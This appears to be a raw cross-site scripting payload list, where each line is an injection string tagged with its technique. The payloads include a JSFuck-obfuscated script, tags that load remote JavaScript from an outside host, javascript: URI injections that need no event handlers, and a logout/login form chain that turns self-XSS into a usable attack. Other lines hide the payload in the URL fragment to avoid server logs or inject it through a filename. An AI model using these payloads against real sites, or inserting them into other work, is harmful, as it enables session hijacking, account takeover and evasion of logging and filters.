%00alert(0)@XSS nullbyte
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()@XSS JSFUCK
<script src=//yoursite.com/1.js>@XSS Code Reuse Regular Script
<script src=//3334957647/1>@XSS Code Reuse Regular Script
<x onxxx=alert(1) 1='@XSS Generic Source Breaking
<script>alert(1)</script> @XSS Without Event Handlers
<iframe src=javascript:alert(1)> @XSS Without Event Handlers
<embed src=javascript:alert(1)> @XSS Without Event Handlers
<a href=javascript:alert(1)>@XSS Without Event Handlers
<math><test href=javascript:alert(1)>@XSS Without Event Handlers
<form action=javascript:alert(1)><input type=submit> @XSS Without Event Handlers
<isindex action=javascript:alert(1) type=submit value=click> @XSS Without Event Handlers
<form><button formaction=javascript:alert(1)>@XSS Without Event Handlers
<form><input formaction=javascript:alert(1) type=submit value=click> @XSS Without Event Handlers
<form><input formaction=javascript:alert(1) type=image value=click> @XSS Without Event Handlers
<isindex formaction=javascript:alert(1) type=submit value=click>@XSS Without Event Handlers
<object data=javascript:alert(1)> @XSS Without Event Handlers
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>@XSS Without Event Handlers
<svg><script xlink:href=data:,alert(1) /> @XSS Without Event Handlers
<math><test xlink:href=javascript:alert(1)>@XSS Without Event Handlers
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>@XSS Without Event Handlers
<html ontouchmove=alert(1)>  @XSS Mobile Only
<body onorientationchange=alert(1)>@XSS Mobile Only
<iframe src=LOGOUT_URL onload=forms[0].submit()>@XSS Generic Self to Regular XSS
</iframe><form method=post action=LOGIN_URL>@XSS Generic Self to Regular XSS
"><img src=1 onerror=alert(1)>.gif@XSS Injection in Filename
<svg onload=eval(URL.slice(-8))>#alert(1)@XSS Server Log Avoidance
<svg onload=eval(location.hash.slice(1)>#alert(1)@XSS Server Log Avoidance
<svg onload=innerHTML=location.hash>#<script>alert(1)</script>@XSS Server Log Avoidance
<script></script>@XSS Keys
<script>@XSS Keys
console.log(1)@XSS Keys
prompt(1)@XSS Keys
onAbort@XSS Keys
onActivate@XSS Keys
onAfterPrint@XSS Keys
onCellChange@XSS Keys
onChange@XSS Keys
onClick@XSS Keys
onOffline@XSS Keys
onPause@XSS Keys
onPopState@XSS Keys
onProgress@XSS Keys
onPropertyChange@XSS Keys
onReadyStateChange@XSS Keys
onRedo@XSS Keys
onRepeat@XSS Keys
onResize@XSS Keys
onResizeEnd@XSS Keys
onResizeStart@XSS Keys
onScroll@XSS Keys
onSelect@XSS Keys
onSelectionChange@XSS Keys
onSubmit@XSS Keys
<img src=x>test</img>@XSS Keys
<iframe src=""></iframe>@XSS Keys
<BR SIZE="&{alert(1)}">@XSS Keys
<LINK REL="stylesheet" HREF="">@XSS Keys
jav	ascript:alert(1);@XSS Keys
" &#14; javascript:alert(1)"@XSS Keys
<DIV STYLE="background-image: url()">@XSS Keys
&#106;&#97;&#118;&#97;@XSS Keys
&#49;&#41;>@XSS Keys
String.fromCharCode(88,83,83)@XSS Keys
onbeforeonload@XSS Keys
